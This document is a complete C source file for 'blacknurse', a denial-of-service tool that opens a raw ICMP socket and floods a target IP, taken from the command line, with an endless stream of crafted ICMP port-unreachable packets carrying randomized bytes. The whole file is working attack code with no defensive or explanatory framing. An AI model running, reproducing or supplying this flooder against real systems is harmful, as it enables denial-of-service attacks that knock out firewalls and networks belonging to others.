#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <netdb.h>
#include <poll.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int blacknurse_main(int argc, char *argv[])
{
    uint8_t pkt_template[] = {
        0x03, 0x03, 0x0d, 0x33, 0x00, 0x00, 0x00, 0x00, 0x45, 0x00, 0x00, 0x1c, 0x4a, 0x04, 0x00, 0x00,
        0x40, 0x06, 0x20, 0xc5, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x08, 0xef, 0xc1
    };
    uint8_t         *pkt;
    struct addrinfo *ai, hints;
    const char      *host;
    struct pollfd    pfd;
    const size_t     pkt_len = (sizeof pkt_template) / (sizeof pkt_template[0]);
    size_t           i;
    int              gai_err;
    int              kindy;

    if (argc < 2) {
        fprintf(stderr, "Usage: blacknurse <target ip>\n");
        exit(1);
    }
    host = argv[1];
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    if ((gai_err = getaddrinfo(host, NULL, &hints, &ai)) != 0) {
        fprintf(stderr, "Unable to use [%s]: %s\n", host,
                gai_strerror(gai_err));
        exit(1);
    }
    if ((kindy = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
        perror("socket");
        exit(1);
    }
    pkt = pkt_template;
    pfd.fd = kindy;
    pfd.events = POLLOUT;
    for (;;) {
        for (i = 20; i < 20 + 8 + 4; i++) {
            pkt[i] = (uint8_t) rand();
        }
        if (sendto(kindy, pkt, pkt_len, 0,
                   ai->ai_addr, ai->ai_addrlen) != (ssize_t) pkt_len) {
            if (errno == ENOBUFS) {
                poll(&pfd, 1, 1000);
                continue;
            }
            perror("sendto");
            break;
        }
    }
    /* NOTREACHED */
    close(kindy);
    freeaddrinfo(ai);

    return 0;
}
